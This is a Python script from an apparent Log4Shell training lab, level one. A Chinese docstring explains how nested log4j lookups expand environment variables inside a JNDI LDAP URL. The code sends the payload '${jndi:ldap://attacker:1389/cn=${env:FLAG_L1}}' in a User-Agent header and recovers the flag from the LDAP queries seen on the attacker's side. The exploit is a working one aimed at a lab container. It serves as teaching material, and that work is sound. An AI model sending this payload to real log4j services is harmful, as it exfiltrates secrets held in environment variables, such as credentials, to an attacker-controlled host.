"""L1 · 探测：不 RCE，也能把环境变量偷出来

大多数人把 Log4Shell 记成"一个 User-Agent 拿 shell"，但 2021 年真实护网里
更常见的用法是先验证回连、顺手外带数据 —— 这一步不需要任何代码执行。

log4j 的 lookup 是**递归**的：解析 ${jndi:...} 之前，会先把字符串里嵌套的
${env:FLAG_L1} 展开。于是原本只是想读个环境变量，拼出来的却是：

    ${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}
                    ↓ 先展开内层
    jndi:ldap://attacker:1389/cn=FLAG{log4shell_...}
                    ↓ 再执行外层
    JNDI 带着这个 DN 来连我们的 LDAP 服务器

攻击者只要看一眼 searchRequest 的 base，flag 就到手了。
注意这一关 LDAP 服务故意不返回 javaCodeBase，避免顺手触发 L2 的 RCE。

跑法：python3 01_probe.py
"""

import sys

from _util import APP, find_flag, inject, reset, show_events, wait

PAYLOAD = "${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}"


def main():
    reset()
    print("L1 · 只发一个 User-Agent，看能不能把环境变量带出来\n")
    print("  payload: %s" % PAYLOAD)
    print("  发送 → %s/\n" % APP)

    status, body = inject(APP, PAYLOAD)
    print("  HTTP %s，应用照常返回（它自己毫无察觉）：" % status)
    for line in body.strip().splitlines():
        print("    " + line)

    snap = wait(lambda s: any(e.get("kind") == "ldap_search" for e in s))
    print("\n=== 攻击者侧看到的事件 ===")
    show_events(snap)

    f = find_flag(snap)
    if not f:
        print("\n[-] 没在 LDAP 查询里找到 flag。" 
              "检查 ./setup.sh 跑过没、app 容器日志有没有报错。", file=sys.stderr)
        return 1

    print("\n[+] L1 flag: %s" % f)
    print("\n要点：lookup 在日志格式化阶段就跑了，跟应用有没有回显、"
          "有没有命令执行都无关。\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
